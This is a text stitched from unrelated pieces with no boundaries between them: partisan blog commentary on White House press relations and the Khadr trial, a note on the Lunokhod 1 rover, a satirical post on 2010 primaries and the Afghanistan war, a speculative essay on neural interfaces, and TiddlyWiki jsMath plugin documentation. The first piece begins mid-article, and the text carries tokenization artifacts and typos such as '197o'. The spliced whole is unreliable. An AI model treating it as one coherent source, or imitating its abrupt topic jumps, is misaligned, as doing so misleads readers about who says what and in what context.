The article notes that aside from punishing reporters who say things it dislikes , the White House rewards those reporters ( with special “ scoops ” and other privileges ) who subserviently promote its agenda , and specifically identifies White House “ favorites ” David Sanger of The New York Times ( the Judy Miller of The Iran Threat ) and Richard Wolffe ( the single most sycophantic White House stenographer after Jonathan Alter ) .
It ’s nice that the White House ’s most loyal journalist - servants are petted on their head for their Good Behavior ( it ’d be sad to see that level of devotion go completely unrewarded ) .
I ’m sure Alter and Ryan Lizza ’s Obama books will be accordingly suffuse with White House favors .
I ca n’t recall reading any sentence quite as illustrative as this one from Politico stating ( without any irony ) that White House reporters insisted upon anonymity because they ’re afraid of angering the White House with their public statements .
Michael Calderone at Yahoo News reported that White House press secretary Robert Gibbs — a couple of week before the Politico piece — said , “ This is the most transparent administration in the history of our country . ”
To this , Mr. Calderone gives a rather relatively heroic response — as pointed out by Mr. Greenwald — that :
The Obama team came to Washington promising transparency , but White House reporters say privately that the administration is not living up to that pledge .
At times , they say , it plays favorites with writers it deems more sympathetic to the administration .
There ’s a thread here of the Obama Administration attacking whistleblowers ’ protection and journalists ’ shields while turning a blind eye to the criminal Bush Administration .
As it continues the crimes of the prior regime , indicting it becomes self - incriminating .
And the journalists covering the current crimes are forcefully being denied the access to inform the public of the government ’s crimes .
EDIT : Scott Horton , international law scholar , commented at his Harper ’s blog : “ The embarrassing secret dealings surrounding the rules coupled with blatant retaliation against critical media serve to highlight their illegitimacy before the actual transactions of the court are even examined . ”
He adds that the Administration ’s only hope is arranging a plea deal .
Seeing as this has been shot down by Mr. Khadr and his military counsel , this is extremely unluckly .
An interesting note to add is that Mr. Khadr ’s counsel is extraordinarily aggressive in pursuing his defense .
Lt. - Cmdr .
Kuebler either has been so disgusted by the treatment of his client that he heavily sympathizes or is objectively fighting that his client is n’t unjustly detained , based on his documentation of reports being altered and his client ’s confession being the sole result of torture .
Either way , this shows exactly why the Administration needs a plea to win and why a guilty verdict would be grossly unjust .
This story stuck out to me , personally , because — as Spencer Ackerman commented at The Washington Independent — Ms. Rosenberg is the “ single most diligent , consistent and experienced Guantanamo Bay reporter in the world , having carved out the Guantanamo beat steadily almost since the detention facility here opened in 2002 and traveled here more frequently than any other journalist ” .
EDIT2 : Rachel Maddow covered this on her show in a heroic manner , Friday night .
A woman e-mailed me , outraged by this story , Friday morning after reading my post .
Tonight , she e-mailed me with the YouTube clip of Ms. Maddow ’s report , so I inserted it at the top of this post .
I ’d give her a hat - tip if she included a link to a website for me to plug of hers , but without her consent , I wo n’t post her name .
I ’ll just say :
Thanks !

Lunokhod 1 was a robot type of rover that the Soviets landed on the moon in 197o thanks to the Luna 17 lander .
Using solar panels during the day and a radioisotope powered heater at night , the rover was able to explore the moon for 322 Earth days .
From NASA :
This first successful Soviet rover operated for 11 lunar days , the equivalent of 322 Earth days .
It traveled more than 10 km across the lunar surface , during which it transmitted more than 20,000 TV images and 206 high - resolution panoramas , performed 25 soil analyses with its spectrometer , and used a penetrometer to test the soil ’s mechanical characteristics at more than 500 locations .
After losing contact with the rover , the project was terminated on October 4 , 1971 .
A team of researchers from the UCSD ( University of California at San Diego ) have been using reflective space junk left on the moon to show deviations in Einstein ’s theory of relativity .
This is accomplished by measuring the shape of the lunar orbit using light pulses , distance and time .
The team leader is Tom Murphy , associate professor of physics at UCSD and they have been searching for Lunokhod 1 for many years .
Tom states :
We quickly verified the signal to be real and found it to be surprisingly bright : at least five times brighter than the other Soviet reflector , on the Lunokhod 2 rover , to which we routinely send laser pulses , Murphy said .
The best signal we ’ve seen from Lunokhod 2 in several years of effort is 750 return photons , but we got about 2,000 photons from Lunokhod 1 on our first try .
It ’s got a lot to say after almost 40 years of silence .

Today 's elections have nothing to do with throwing out incumbents and everything to do with affirming the status quo .
Not a single candidate who opposes the war in Afghanistan is expected to win .
It will take a lot more than partisan primaries to end the war .
I am the Afghanistan Blogging Fellow for The Seminal and Brave New Foundation .
You can read my work on The Seminal or at Rethink Afghanistan .
The views expressed below are my own .
Oh my gosh , did you hear ?
There ’s a revolution happening today !
That ’s right , you the governed citizens are literally overthrowing your government , and all it took was voting in the party primaries .
Here ’s Chris Matthews to explain :
Sounds like a revolution all right .
Really , voting for Rand Paul is just like shouting “ allahu akbar ” at Khameini from a Tehran rooftop or getting crushed under the treads of a Soviet tank in Black January .
Just like it .
But wait , how come Specter is the evil establishment because he has the support of unions , but Halter is part of the “ angry grassroots ” because he …has the support of unions ?
Does the support of Daily Kos really qualify as fringey and outsider ?
Is n’t Markos Moulitsas like the Green Day of activists ?
Do n’t get me wrong , my shelves are packed with his books , but I do n’t think it really counts as punk rawk anymore .
And how is Rand Paul an outsider ?
He ’s the son of Texas politician Ron Paul , who ’s really more of a brand name than a person at this point .
There ’s too many questions that do n’t fit with our absurd narrative , so let ’s skip it .
Instead , let ’s hear about the insurgency :
Next week , if Joe Sestak defeats Sen. Arlen Specter in the Pennsylvania Dem primary , and Sen. Blanche Lincoln is forced into a runoff against challenger Bill Halter , lefty insurgents will have scored two major victories against the Democratic establishment in Washington .
Neato , you ’re an insurgent !
Phone banking for Halter is kind of like burying an IED on your family farm , and really , is n’t the fact that you disagree with Blanche Lincoln on financial regulation kind of like she ’s storming your house at night and gunning down your pregnant wife and young children ?
I mean you ’re not just unseating Specter , you ’re setting his dead body on fire and hanging it from a bridge in Fallujah .
You did n’t know American politics were this hardcore did you ?
Thanks a lot media , it ’s fun to be an insurgent !
But let ’s get real .
This media narrative about insurgencies and revolution is just plain bullshit .
Today ’s elections have nothing to do with throwing out the bum incumbents , and everything to do with affirming the status quo .
Not a single candidate who opposes the war in Afghanistan is expected to win today .
It will take a lot more than partisan primaries to achieve the changes we want to see .
Not even Rand Paul opposes the war , he ’s a million miles away from his father ’s foreign policy ideas , to the point of actually supporting Guantanamo .
For real .
The Democratic candidates on the other hand are even weirder .
Specter the dastardly incumbent has been a vocal opponent of President Obama ’s strategy in Afghanistan .
Meanwhile Sestak the lefty insurgent supports the severe escalation of 30,000 troops ( y’know , cuz of all the al - Qa’eda ’s there ) and does n’t support the McGovern bill .
HR 5015 only calls for a timeline , not even a withdrawal .
Well actually Sestak just does n’t support McGovern ’s timeline , it ’s way too pragmatic and realistic .
No , this Mighty Lion of Progressivism prefers a magically perfect timeline that does n’t exist ( emphasis mine ) :
“ Additionally , last year I wrote to the President asking him to provide Congress and the American people with an exit strategy .
I have consistently called for an exit strategy based on clear benchmarks of success and / or failure that will allow us to monitor whether the benefits of continuing outweigh the costs and that will trigger our exit if the mission is achieved , or an alternative strategy ( including containment ) if our goals are not being met .
I believe that such an exit strategy is superior to the one called for in H.R. 5015 , because it requires the President to present us with a completed strategy now .
While H.R. 5015 requires a timetable for withdrawal , this timetable is subject to revision , whereas my plan is comprehensive from the beginning . ”
Right , good logic .
I recommend it for , say , homeless people .
They should get a job , but only if it immediately pays $ 100 million a year with benefits and you can never get fired .
I mean you really have to weigh “ the benefits of continuing ” to be homeless before you decide it ’s good enough to “ trigger ” getting a job , and only then if it ’s “ comprehensive ” and “ completed now . ”
Just like Afghanistan , what with all the sweet ass benefits we continue to reap from the war , we really should think twice ( Rethink ? ) before we “ trigger our exit . ”
Before “ the mission is achieved ” of course .
Boy , this Sestak sounds like a real lefty wingnut , Pennsylvania ’s Che Guevara !
Be an insurgent by prolonging the occupation !
Huh ?
But I thought the media said Marcy Winograd was from the angry grassroots .
And Elaine Marshall , was n’t she supposed to be some kind of freaky outsider candidate , too ?
And that ’s bad !
Except today it ’s awesome !
Hmm , Winograd and Marshall are both anti-war , so they ’re lunatic leftists on the fringe .
But Halter , Sestak , and Paul are pro-war , so they ’re insurgent freedom fighters .
Oh , I get it .
Is it clear how nose - bleedingly stupid this anti-incumbent revolution narrative is yet ?
Sorry , you are not an insurgent .
You ’re not overthrowing the government and you ’re not the Democratic party ’s version of the 1920 Revolution Brigades because you voted for Bill Halter in the primary .
We are unshakably enfranchised American citizens , and we ’ve forgotten how to act like it .
Voting for someone who claims to agree with you , even on domestic issues alone , is not enough .
We have to pressure our elected representatives to get the changes we want .
It even takes pressure to get change on the issues they already pander to , much less getting them to switch positions entirely .
And supporting the war in Afghanistan is a radical position to begin with .
It takes some kind of wild - eyed extremist to look at the disturbing corruption and outrageous massacres and then decide the occupation should continue of all things .
It will take concerted , ongoing effort beyond voting day to force them to wake up to reality .
If you vote for Paul , will you also pressure him to sign on to a withdrawal timetable ?
Will you shut down Sestak ’s offices if he votes for the $ 33 billion in war funding ?
Will you demand that Halter see the truth about Afghanistan or negotiate in good faith with Pakistan ’s government ?
Will you force them to see the price we ’re paying , the blood we ’re spilling , the crimes we ’re committing ?
Or will you be satisfied with the vote ?
Today is not the last day of Bill Halter ’s Revolution , it ’s the first day of the rest of his life .
No matter who you vote for , no matter who wins in November , they have to be pushed for every inch of progress , every last line of policy .
We can force real change , we can force an end to this bloody and expensive war in Afghanistan .
But it takes a lot more than voting to achieve it .
Thankfully , you wo n’t be alone doing it .
Join us on Rethink Afghanistan ’s Facebook page and collaborate with the tens of thousands of others around the country working to bring this war to an end .
As human neural networks and electronic digital networks converge there is some debate over how to best move data from neural to digital formats .
Since the human brain is equipped with high - resolution sensory organs , there are many obvious routes for digital - to - neural input , but organic systems lack sufficient neural outputs for porting thoughts , memories , and dreams directly to digital memory .
A variety of methods have been pioneered to capture digital thought , including embedded sensor wires , embedded sensor grids , and non-invasive dermal sensors .
Initial success with neural interfaces indicates that progress in this field is possible , but each method has distinct functional limitations and problems .
Given the severity of modification needed for high - resolution neural - to - digital memory capture , analysis suggests a mix of invasive and non-invasive methods will be customized to meet specific end - user needs , and that the popular market will lean more towards minimally invasive “ good - enough ” technologies as opposed to radically invasive technologies for the high - end consumer .
EEG Helmets and Headbands
Based on the history of the videogame console market we can expect commercial neural interfaces to diverge into a handful of proprietary and incompatible platforms .
In the field of electroencephologram ( EEG ) brainwave sensors , a small number of contenders have emerged in niche markets .
Mattel ’s MindFlex is geared for low - end gaming and personal consumer use ; the Emotiv Epoch is designed to be a high - end gaming and biomedical device controller ; and the g.tec Intendix is designed as an EEG - based typing system for the disabled .
EEG helmets do not provide precise control over output : the data captured by an EEG helmet is a crude aggregation of surface brain activity and responds only to general commands .
The Emotiv Epoch , for instance , is only capable of 12 distinct control options , making it comparable to a console game controller that takes some training and practice to master .
EEG interfaces are well suited for playing video games , controlling wheelchairs and computers , or performing tasks like choosing YES or NO while scrolling through a list of options , but they ca n’t read internal thoughts or interpret internal visual data .
While EEG hardware platforms are still proprietary , their simple USB interfaces make them highly extensible .
For instance , the Emotiv Epoch has already been tested as a thought - based remote - control for a spy robot , and the MindFlex has been hacked by Harcos Labs into the worst toy ever , a meditation / torture device that rewards you for keeping your mind still and shocks you for thinking .
The upside to EEG helmets is that they all employ a similar technology , they are non-invasive , and they can be removed at will ; the downside is that they lack fine control , they take some training and practice to use , and they require a high level of concentration to master .
The price for commercial EEG headsets is still well over $ 200 , and their use is fairly rare , but it is reasonable to assume that EEG controllers will become more common once the price point drops under $ 100 , or perhaps when Nintendo comes out with an EEG game package for the Wii .
Using an EEG headset as a personal memory device ( PMD ) to monitor daily brain activity may , over time , generate software - based solutions for extrapolating complex thoughts from broad surface - level readings .
Intel recently demonstrated software that can predict what a subject is thinking by scanning their fMRI readings .
Functional MRI scans are higher powered and more detailed than EEG readings , but the general model for brainwave mind - reading is coming together .
In the future non-invasive EEG scanners may be improved with better sensors , like electronic potential sensors ( EPS ) that can read brainwaves at a distance of a few meters away , even through walls .
A mix of EEG and EPS sensors integrated into a single headset may allow finer degrees of control monitoring and output .
Neural Conduction Sensors
Neural conduction sensors monitor electrical activity though the skin , through the nerves , or through muscles .
The most common form of neural sensor is the transdermal electrode array , a grid of pins stuck directly into the skin , nerves , and muscle tissue , much like you would stick a microchip into circuit board .
Kevin Warwick famously used a transdermal electrode array embedded in his forearm to control a bionic hand and share non-verbal neural pulses with his wife , who was also connected to a transdermal electrode array .
Even though transdermal sensor arrays require sticking pins into the skin , they allow a very fine level of control .
A typical Utah electrode array is a ten by ten grid of 100 pins embedded directly into tissue .
This allows for fine signal detection and aggregation from a relatively small patch of interface , which can be further optimized by having multiple embedded sensors working in unison .
Embedded electrode arrays are crude solutions for testing neural interfaces , but organic problems such as infection and scarring make them problematic for long - term use .
A non-invasive alternative to embedded electrodes is being explored by Ambient Technology in a device called the AudeoSensor .
The Audeo was developed to measure energy conduction around the laryngeal muscles for controlling speech production , and uses stainless steel electrodes to read differential voltage across the skin in the front of the throat .
A user with the Audeo strapped to their neck can activate a phoneme - recognition dictionary just by thinking clearly in sub-vocalized speech ; thinking about speaking .
Using this technique , Michael Callahan of Ambient made the world ’s first voiceless phone call at the 2008 Texas Instruments Developer Conference in Dallas , using an Audeo sensor to “ think ” through a Bluetooth connection and have it translated to speech on his cell phone .
Like an EEG sensor , the Audeo takes surface - level electrical activity and aggregates it into a library of control options .
With the laryngeal muscles , there is a precise predictability to the rhythm of speech , making the task of aggregating sub-vocalized impulses at the muscle easier than capturing a similar brainwave library .
With the proper software interface , users with a device like the Audeo strapped to their neck should be able to send text messages by thought , make mental notes and save them to a file , or capture what they are thinking in a running journal or phone conversation with a high degree of accuracy .
There is a subtle difference between thinking internal thoughts and producing sub-vocalized speech , but that difference is minor enough to overcome with some training .
With the proper laryngeal sensors , learning how to turn verbal thought into mental commands is a matter of practice and mastering a new library of subtle verbal motor skills .
Non-invasive dermal contact plates , like those used in the Audeo , can be applied to any muscle group for exerting sub - motor control over external devices just by thinking about moving .
Embedded Neural Interfaces
Early work with embedded wires or electrodes in the brain have shown that neurons fire in direct response to electrical stimulation , and that electrical stimulation from embedded electrodes can be translated directly into perception .
Most embedded electrode research has focused on correcting behavioral and motivational problems ( such as depression , Parkinson ’s disease , and lack of libido ) by stimulating glands in the brainstem or basal forebrain to promote fine - tuned transmitter release , typically focusing on the dopamine pathways .
Embedded electrodes are inserted into deep brain tissue through a hole in the skull and targeted to stimulate a very small group of neurons .
They are designed to be unidirectional controllers for sending current into the brain .
They do not sense or decode neural activity for digital output , however there is nothing stopping an embedded electrode from being designed to do both .
A visual prosthesis that relies on a Utah sensor or similar electrode array being implanted directly into the visual cortex has been proposed , allowing visual input and output of cortical activity through a something like a video card or digital camera interface .
An eight - by - eight array of 64 electrode points per hemisphere of the visual cortex has been estimated as easy starting point for maintaining referential integrity in cross-porting the visual field .
At this bit - depth visual representations will be blurred and pixilated , but can still help blind people navigate around real - world obstacles .
Topographical mapping of visual activity through fMRI monitoring can predict the best locations and depth of electrode insertion needed to promote precise perceptual input and output , and electrode placement can be customized to the visual mapping patterns of each individual .
Obviously this procedure would involve something like a craniotomy , where a section of the skull is removed to allow direct access to the cortex .
A visual prosthetic sensor array may be embedded as a mesh or grid of electrodes placed directly onto the visual cortex , or may be attached to the interior surface of the skull .
A specialized Bluetooth adapter or USB port can be drilled through the skull plate for plug - and - play neural I /O access .
When you plug in your brain interface your eyes become an instant webcam ; your imagination becomes an instant computer monitor .
Digital visual prosthetics will be developed first for the blind , but as the technology is perfected cheap access to multisensory porting will drive demand for military , academic , industrial , and recreational applications .
The concepts applied to a visual electrode array can be applied to a verbal array embedded in Broca ’s Area in both hemispheres of the medial forebrain , where language and internal speech originates .
A sensor located in this area can monitor the spontaneous production of internal thought , and may also be a good target for digitally monitoring emotional content of experience .
An array of embedded electrodes in both the vision and speech areas of the brain would provide almost complete control over input and output of multisensory awareness .
Specialized pathways for controlling machinery may also be exploited through these methods , as demonstrated in the experiment where a monkey was able to manipulate a mechanical arm with a 100 - pin Utah electrode the size of a freckle placed directly on its motor cortex .
Taking these techniques a step further , electrodes implanted in the hippocampus and medial temporal lobe may also be able to monitor dreams , sense memory visualization , generate spiritual experiences , and port music directly into and out of the brain .
The ability to port data in and out of consciousness has been demonstrated in multiple capacities with multiple interfaces ranging from low - fidelity non-invasive to high - fidelity radically invasive .
Next Generation Interfaces
Early experiments have demonstrated that neural tissue can be quickly adapted to communicate through embedded digital sensors .
Judging from the experiment with the monkey and the robotic arm , mastering control of an embedded device takes days , not weeks or months .
Training with embedded interfaces drives neuroplasticity and new signaling pathways to promote fast and robust connections with the device .
Just as motor pathways grow to promote more precise control over machines , sensory pathways will grow to precisely capture , route , and analyze signals from sensory prosthetics .
Neuroplasticity ensures that human networks can adapt to digital sensors through training , but currently digital sensors cannot adapt to human physiology .
This can cause some problems .
Embedded sensors are not organic , so they can cause infection , scarring , and are susceptible to slow corrosion in an organic environment .
Because of these limiting factors , even well - designed synthetic sensors will have a useful life of a few months to a year before scarring or slow degeneration means they must be removed or replaced .
The obvious solution to these long - term problems is to build a better interface .
Kevin Warwick , the man who embedded an electrode array into his forearm to control a robotic hand , has also demonstrated that rat neurons can be adapted in vitro ( in a dish ) to interface with a circuit board and control a small robot car .
Over time , these embedded neural controllers test and learn the operations of the vehicle until they begin to pilot themselves in insect - like fashion around the environment .
Taking this experiment from the motor to the sensory level , it is possible that a similar neuron - chip wired into a sensory feedback loop with a digital camera and video output electrode array will learn to use the camera and start navigating via visual cues .
If device control can be grown spontaneously in a dish through simple trial - and - error plasticity , there is a good possibility that neural sensory interfaces for any digital device can be ported directly from the cortex in a similar manner .
To attach a neural video controller to the human brain , an array of micro - fine holes would be laser - drilled into the back of the skull in a ten - by - ten grid for each hemisphere of the cortex .
These holes would then be fitted with gold or stainless steel sleeves that allowed pre-grown neural fibers to be inserted and removed through micropipettes .
The micropipettes would pass through the sleeves and pierce the fine outer layer of cortex at the depth of under a millimeter , allowing neural signals to pass through the skull via electrode - capped terminals or transdermal / transcranial contact points under the skin .
Embedded cranial terminals would then connect via a cap or device worn around the back of the skull containing a pre-grown neural device - controller with the same bit resolution established for the camera ’s visual field .
When terminal contact was made with an external device controller , the neural interface would begin generating input and output directly from device to cortex .
With synaptic plasticity generated by both the input and output terminals of the controller and cortex , the subject would quickly wire robust digital - visual pathways simply by practicing and learning how to use the interface .
A neural electrode , or a neurode , poses many significant advantages over a metal electrode or a wire .
A neural bundle passed through a sleeve in the skull will not present the same risk of infection , scarring , or corrosion as an embedded wire .
A neural bundle on the interior of the skull can feed and power itself from blood oxygen and glucose , it does not need batteries or electrical stimulation to send and receive signals and can self - repair normal wear and tear .
A neural controller capped with a conductive terminal on the outside of the skull and fiber - optic bundles on the interior of the skull can interface with electrical sensors and optogenetic controllers that send neural packet information in pulses of green or yellow light , as opposed to pulses of electricity .
Optogenetic controllers offer a much finer control over direct neural signaling than electrical controllers .
Optogenetic neurons are genetically altered to contain light - sensitive signaling mechanisms ; green LEDs send signal and yellow LEDs inhibit signal .
A combination of fiber optic , optogenetic , and transcranial neurode controllers offers the highest bandwidth and highest fidelity potentials of any interface that can be constructed with existing technology .
An optogenetic neurode controller with an 1800 stereo bit depth is estimated to be enough for neural - to - digital output with the initial visual fidelity of a cheap digital camera .
This would equal 1800 neurode contact points in 30×30 arrays on each side of the visual cortex .
Over time , this array would adapt to higher fidelity input and output , reaching HDTV levels and then full 3D topographical rendering within weeks to months of cross-training and mutual plasticity between subject and controller .
Although an optogenetic neurode array promises seamless transfer of neural - to - digital data , the technology poses some interesting ethical and physiological questions .
Admittedly , no one wants rat neurons growing into their brains , so neural donors will have to be sourced and genetically typed to resist rejection .
If a neurode array is custom built for an individual , the custom controllers would optimally be grown from neurons or stem cells harvested from that individual ; this would make the neurode controller a true extension of that individual ’s physiology .
Neurode arrays can be attached through micro-channels drilled through the skull , or they can be embedded like a screen or mesh along the interior of the skull during a craniotomy ; this method would allow for full - hemisphere cortical access through a single drilled transcranial access port .
Because neurodes are organic and wire themselves directly into the sensory network , they can be defined as a type of exo-cortex , or a digital extensibility layer of the neo-cortex , making them very difficult to remove once they are attached .
Any exo-cortical controllers using live neurons or neurode arrays to interface with cortical structures should come with a genetic kill code that causes the neurodes to instantly sever their synaptic connections .
This code would be applied before the array was removed to prevent synaptic tearing , and would presumably kill most of the interface neurons in the controllers , making them useless .
Perfecting a clean neurode removal process may be more difficult than building the actual interface , so any embedded neurode solution must be considered to be permanent or semi-permanent from the outset .
Although the concept of a neurode array is applied here to a full visual cortex controller , it is possible to imagine a more simplified model being scaled to the size of an eyeball , where an artificial pre-grown retinal photo - controller array feeds through a neurode ganglion directly into the optic nerve , forming the basis of an integrated artificial eye .
Artificial sensory organs may also be attached through a neural cuff , like the recently developed flat interface nerve electrode ( FINE ) , which uses a clamp that flattens the nerve to capture impulses and carry them across severed nerve pathways .
Theoretically , if you were to attach FINE clamps to both optic nerves and then to both cochlear nerves , your eyes and ears would become stereo audio - visual I/O ports for capturing and receiving sensory data .
A multi-sensory wiretap like this one would provide a seamless upstream interface for basic sensory input and output , but it would not be able to render downstream cortical information like thoughts , feelings , and dreams .
If the process of attaching cuffs or patch cables to existing nerve bundles is perfected , this means hard neural I / O ports can be created where artificial organs and sensory peripherals can be swapped between existing neural inputs without surgery .
The final piece to embedded neural interfaces is the power source , which in the past has been a problem , but in next - generation devices will be completely organic .
Instead of using batteries , embedded devices will run on bioelectric power from the body ’s cellular metabolism .
Aleksandr Noy has recently demonstrated a carbon nanotube transistor that can generate electric current in the presence of adenosine triphosphate ( ATP ) , the chemical messenger that carries metabolic energy through living tissue .
Assuming this technique can be integrated into embedded devices , then cellular activity at the prosthetic interface should also generate the current needed to power the device ’s embedded electronics .
To minimize the hassle of having bulky hardware permanently strapped or plugged into the skull , embedded devices would optimally enable wireless connectivity with something like a Bluetooth controller worn over the ear .
The use of bioelectric transistors that generate their own current could potentially enable low - power wireless device connectivity through the skull without the need to change implanted batteries .
Ongoing Concerns
The ability to port data in and out of consciousness has been demonstrated in multiple capacities with multiple interfaces ranging from low - fidelity non-invasive to high - fidelity radically invasive .
Although these technologies seem like science fiction , they are being vigorously explored by academic , medical , and commercial interests , with companies like BrainGate seeking patents on multiple neural interfaces and software platforms simultaneously .
While the primary purpose of neural interface research is putatively therapeutic , the functional potentials and ethical concerns of neural porting are problems looming in the future .
Right now these are hypothetical concerns , but if a single - access embedded neurode procedure could be perfected and automated and performed at a local clinic in two hours for around a thousand dollars , and it was covered by insurance , the temptation for cosmetic and personal use of such a procedure becomes clear .
Neural interfaces can be abused , obviously , and can be hacked into to enslave and torture minds , or drive people intentionally insane , or turn them into sleeper assassins or mindless consumers .
Security is an inherent problem of any extensible exo-cortical system that must be addressed early in the engineering and testing stages , or anyone with an exo-cortical input would be ripe for exploitation .
Sensory discrimination is an ongoing problem in any media environment , so individual channel selection , manual override , and the ability to shut down device input should be an integral part of any embedded system .

| Version |1.6 | | Requires| [ [ TiddlyWiki|http://www.tiddlywiki.com]] ≥ 2.0.3 , [ [ jsMath|http://www.math.union.edu/~dpvc/jsMath/]] ≥ 3.0 | ! Description LaTeX is the world standard for specifying , typesetting , and communicating mathematics among scientists , engineers , and mathematicians .
For more information about LaTeX itself , visit the [ [ LaTeX Project |http://www.latex-project.org/]].
This plugin typesets math using [ [ jsMath|http://www.math.union.edu/~dpvc/jsMath/]], which is an implementation of the TeX math rules and typesetting in javascript , for your browser .
Notice the small button in the lower right corner which opens its control panel .
! Installation
In addition to this plugin , you must also [ [ install jsMath
|http://www.math.union.edu/~dpvc/jsMath/download/jsMath.html]] on the same server as your Tiddly Wiki html file .
If you 're using TiddlyWiki without a web server , then the jsMath directory must be placed in the same location as the TiddlyWiki html file .
I also recommend modifying your StyleSheet use serif fonts that are slightly larger than normal , so that the math matches surrounding text , and \\small fonts are not unreadable ( as in exponents and subscripts ) .
{{{ .viewer { line - height : 125 % ; font - family : serif ; font - size : 12pt ; } }}}
You may also optionally add the following code to load jsMath in [ [ MarkupPostHead ] ] if you desire .
{{{ <!--{{{--> < script src=" jsMath/jsMath.js " ></ script > <!--}}}--> }}} [ [ Plugin : jsMath ] ] will normally load jsMath dynamically using AJAX , but adding the above in [ [ MarkupPostHead ] ] may be useful if you have jsMath stored in a non-standard location , or if your browser 's cross - site origin policy forbids loading files from file URL's using AJAX .
